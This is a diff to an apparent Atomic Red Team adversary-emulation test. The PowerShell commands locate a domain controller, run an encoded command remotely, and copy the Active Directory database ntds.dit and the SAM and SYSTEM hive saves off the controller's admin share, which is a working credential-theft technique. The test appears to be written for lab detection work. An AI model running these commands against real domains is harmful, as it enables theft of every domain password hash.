@@ -16,7 +16,11 @@ atomic_tests:
   - windows
   executor:
     command: |
-      $dc = ${env:LOGONSERVER}.substring(2)
+      nltest /dclist:$domain | % {
+          if($_ -match '\\\\([^'']+)'){
+              $dc = $matches[1]
+          }
+      }
       invoke-command -ComputerName "$dc.lab.lan" -UseSSL -Authentication Negotiate -ErrorAction SilentlyContinue {
           $ps1 = @'
               $service=(Get-Service -name VSS)
@@ -32,11 +36,10 @@ atomic_tests:
           $encodedCommand = [Convert]::ToBase64String($bytes)
 
           powershell -enc $encodedCommand
-
-          copy-item c:\temp\ntds.dit \\win10-dsk1.lab.lan\c$\temp\
-          copy-item c:\temp\dcsam.save \\win10-dsk1.lab.lan\c$\temp\
-          copy-item c:\temp\dcsam.save \\win10-dsk1.lab.lan\c$\temp\
       }
+      copy-item \\$dc\c$\temp\ntds.dit c:\temp\
+      copy-item \\$dc\c$\temp\dcsam.save c:\temp\
+      copy-item \\$dc\c$\temp\dcsystem.save c:\temp\
     name: powershell
 
 # T1560 Archive Collected
